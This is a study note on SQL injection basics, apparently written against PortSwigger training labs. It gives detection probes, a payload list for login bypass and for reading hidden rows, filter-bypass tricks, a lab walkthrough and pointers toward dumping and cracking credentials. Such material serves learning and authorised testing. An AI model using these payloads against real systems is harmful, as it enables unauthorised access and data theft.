# SQL injection - Basics & detection

First-contact SQLi: confirm the bug and land the two highest-value low-effort wins - reading hidden rows and bypassing authentication by commenting out the password check. Max impact here: full auth bypass / login as admin without credentials.

## Quick reference

```
'                     -> error or response change = candidate
''                    -> error disappears = strong SQLi signal (quote balancing)
'--                   -> comment out rest of query
' OR 1=1--            -> boolean-true, returns all rows (DANGER: may hit UPDATE/DELETE too)
Gifts'--              -> category filter: drops trailing `AND released=1`
administrator'--      -> login form: logs in as administrator, no password
' OR 1=1 LIMIT 1--    -> login when username unknown (first row, often admin)
```

Detection decision list:
- See a DB error on `'` -> injectable string context. Add `--` to fix syntax, proceed.
- `'` breaks, `''` restores -> quote-balanced injection confirmed even without visible error.
- `OR 1=1--` returns more rows / `AND 1=2--` returns fewer -> boolean control confirmed.
- No visible change -> escalate to blind (see `../Blind-boolean/`, `../Blind-time-based/`, `../Out-of-band-OAST/`).

## Root cause
User input is concatenated into a SQL string instead of bound as a parameter:
`"... WHERE category = '" + input + "'"`. Any input containing `'`, `--`, or SQL keywords changes the query's structure. Expect it on: category/filter params, search, login forms, sort/`ORDER BY` params, any ID that maps to a `WHERE`.

## Find it (recon and detection)
- **Entry points:** every parameter - query string, body, cookies, headers, JSON/XML fields. Test each independently.
- **Probes (in order):** `'` -> `''` -> `'--` -> `' OR 1=1--` vs `' OR 1=2--`. Watch for: HTTP 500, DB error text, row-count change, length change, or a redirect/login-state change.
- **The 5 systematic detection methods (Academy "How to detect", run against EVERY entry point - query/body/cookie/header):**
  1. Single quote `'` -> look for errors or anomalies.
  2. SQL-specific syntax that evaluates to the **base** value vs a **different** value -> look for systematic response differences (e.g. `1` vs `0+1`, `cat` vs `c'||'at`).
  3. Boolean conditions `OR 1=1` vs `OR 1=2` -> look for response differences (boolean oracle -> see `../Blind-boolean/`).
  4. Time-delay payloads (`SLEEP`/`pg_sleep`/`WAITFOR`) -> look for differences in response time (-> `../Blind-time-based/`).
  5. OAST payloads triggering an out-of-band (DNS/HTTP) interaction -> monitor Collaborator (-> `../Out-of-band-OAST/`).
  - Fast first pass: **Burp Scanner** finds the majority reliably; then confirm/exploit by hand.
- **Burp tells:** a single quote that flips a 200->500, or changes response length; differing responses between the `1=1` and `1=2` twins.
- **False-positive check:** a generic 500 on any junk input ≠ SQLi. Require the *boolean pair* to differ systematically (`1=1` true-shape vs `1=2` false-shape), or `'` vs `''` to toggle the error.

## Technique
**1. Retrieving hidden data (WHERE-clause widening).** App shows a filtered subset (e.g. released products). Comment out the server's own filter, or OR-true the WHERE:
- `category=Gifts'--` -> `WHERE category='Gifts'--' AND released=1` (filter dropped).
- `category=Gifts'+OR+1=1--` -> returns every row.
- ⚠ `OR 1=1` is dangerous: the same input may be reused in an `UPDATE`/`DELETE` elsewhere -> mass data change. Prefer `'--` or a scoped condition on real targets.

**2. Subverting application logic (auth bypass).** Query is `SELECT * FROM users WHERE username='X' AND password='Y'`. Comment out the password check:
- username = `administrator'--`, password = anything -> `... WHERE username='administrator'--' AND password='...'`.
- Unknown username: `' OR 1=1 LIMIT 1--` (logs in as first row). MySQL: use `-- ` (trailing space) or `#`.
- Variations by context: if app uses `... LIMIT 1`, `OR 1=1` returns the first user; if it builds a different query shape, adapt the comment/quote.

**Advanced / edge cases:**
- **Numeric context** (no quotes): `id=1 OR 1=1`, `id=1-- ` - no `'` needed.
- **Comment styles:** `--` (most), `-- ` MySQL, `#` MySQL (`%23` in URL), `/*...*/` inline (also a space-replacement for WAF/space filters).
- **Quote-less string break:** if quotes are filtered, sometimes the value is numeric or you can use `CHAR()`/hex.
- **Second-order:** value stored safely on one request, concatenated unsafely when later read - register a username like `admin'--`, trigger the later query.

## Payload arsenal
```sql
-- detection
'         ''        '--        '#        ');--       ' OR '1'='1
-- WHERE widening
Gifts'--
Gifts' OR 1=1--
Gifts' OR 1=1-- -        -- MySQL trailing-space comment
-- auth bypass (username field, blank/any password)
administrator'--
administrator'#                 -- MySQL
administrator'/*
' OR 1=1--
' OR 1=1 LIMIT 1--
' OR 1=1-- -                    -- MySQL
"-- and "  variants if the app quotes with double quotes
-- numeric context
1 OR 1=1
1) OR (1=1
```

## Bypasses
| Blocker | Bypass |
|---|---|
| `--` stripped | use `#` (MySQL), `/*...*/`, or balance quotes: `' OR '1'='1` |
| spaces filtered | `/**/`, `%09`, `%0a`, `+` (in some parsers), parentheses |
| `OR`/`AND` keyword filtered | `||`/`&&`, `OR`->`%4fR` case/encoding, double-encoding, `' OR/**/1=1` |
| quote filtered, numeric param | drop quotes: `1 OR 1=1` |
| keyword blocklist / WAF | see `../WAF-filter-bypass/` (XML/JSON entity encoding) |

## Exploitation walkthrough (auth bypass, end-to-end)
1. `GET /login` -> scrape the `csrf` token from the form.
2. `POST /login` body: `csrf=<token>&username=administrator'--&password=x`.
3. Server query: `SELECT * FROM users WHERE username='administrator'--' AND password='x'` -> password check commented out, returns the admin row.
4. Session cookie now authenticated as administrator. `GET /my-account` shows "administrator" -> solved.
*(Verified hands-on: lab instance went Not solved -> solved with exactly this.)*

## Chaining
- Pairs with [Access-control](../../Access-control/): bypass to admin, then hit admin-only functions.
- If results are visible, escalate to [UNION-based](../UNION-based/) to dump the full users table instead of just logging in.
- Dumped password hashes -> offline cracking -> credential stuffing across the org.

## Tools
- **Burp Repeater:** hand-craft the `'`/`''`/`1=1`/`1=2` probes; compare response length/status.
- **Burp Intruder:** fuzz a param with a SQLi wordlist; sort by status/length to spot the anomaly.
- **Burp Scanner:** fastest reliable first-pass detector.
- **sqlmap:** `sqlmap -u URL --data=... -p param` to automate once a candidate is found (note: labs are best done by hand to learn the shape).

## Labs

### Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data [Apprentice]
- URL: https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data
- Goal: make the unreleased products show.
- Method: `GET /filter?category=Gifts'+OR+1=1--`. Query becomes `... WHERE category='Gifts' OR 1=1--' AND released=1`. All rows return.
- Confirms: product count jumps (verified: 3 -> 20). Key insight: `--` kills `AND released=1`; `OR 1=1` makes WHERE universally true.
- Real-target transfer: any list/filter/category param -> test `'`, `'--`, `' OR 1=1--`; a sudden jump in returned items = win.

### Lab: SQL injection vulnerability allowing login bypass [Apprentice]
- URL: https://portswigger.net/web-security/sql-injection/lab-login-bypass
- Goal: log in as administrator.
- Method: `POST /login` with `username=administrator'--` and any password. Comments out the `AND password=...` check.
- Confirms: redirected to authenticated account page as administrator. Key insight: the username field is concatenated into the auth query; `'--` truncates it after the username match.
- Real-target transfer: any login/auth form - put `'--` after a known username, or `' OR 1=1 LIMIT 1--` when the username is unknown.

## Real-world notes
- Login-bypass via `'--` is rare on mature apps (parameterized auth) but still appears in legacy admin panels, IoT/embedded web UIs, and internal tools.
- False positives: WAFs that 500 on any `'`; confirm with the boolean pair.
- Impact/CVSS: auth bypass to admin is typically Critical (CVSS ~9.8 if pre-auth and remotely reachable). Hidden-data read alone is lower but proves the injection.

## References
- https://portswigger.net/web-security/sql-injection
- https://portswigger.net/web-security/sql-injection/cheat-sheet
